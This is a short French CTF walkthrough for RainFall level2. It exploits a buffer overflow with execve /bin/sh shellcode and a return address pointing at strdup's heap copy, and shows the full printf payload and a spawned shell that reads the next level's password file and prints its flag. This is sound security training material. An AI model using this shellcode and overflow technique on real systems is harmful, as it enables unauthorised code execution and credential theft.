Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
offset 80

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
il faut trouver l'adresse du buffer
0x80482b5 adresse du buffer ?
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac\xb5\x82\x04\x08

on essaye avec un shellcode qui fait exec /bin/sh avec l'adresse potentiel du buffer
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab\xb5\x82\x04\x08

le shellcode ne passe pas le if de verif on doit trouver une autre solution

On va tester avec le strdup et recuperer son adresse

on s'appercoit que l'adresse de strdup est deterministe et vaut ici 0x0804a008

on va du coup mettre dans le buffer le shellcode + assez de caractere pour overflow + l'adresse du strdup
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab\x08\xa0\x04\x08

level2@RainFall:~$ printf "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab\x08\xa0\x04\x08" > /tmp/level2
level2@RainFall:~$ cat /tmp/level2 - | ./level2 

1���
    Qh//shh/bin��̀Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab35Ab6Ab7Ab8A�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

on utilise encore une fois cat - pour avoir un shell qui ne se ferme pas
le shellcode qui contient le execve /bin/sh est execute dans le strdup et boom on est admin